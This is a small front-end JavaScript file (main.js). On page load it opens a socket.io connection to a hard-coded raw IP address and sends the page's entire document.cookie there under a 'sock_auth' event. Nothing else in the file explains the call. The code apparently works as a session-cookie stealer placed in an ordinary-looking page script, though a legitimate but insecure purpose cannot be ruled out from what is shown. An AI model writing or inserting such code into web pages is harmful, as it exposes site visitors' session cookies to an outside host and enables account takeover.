/* main.js */

$(function () {
    console.log("Ready!");

    var socket = io.connect('wss://24.4.237.252/sock');
    socket.on('connect', function () {
        socket.emit('sock_auth', { "cookie": document.cookie });
    });
});
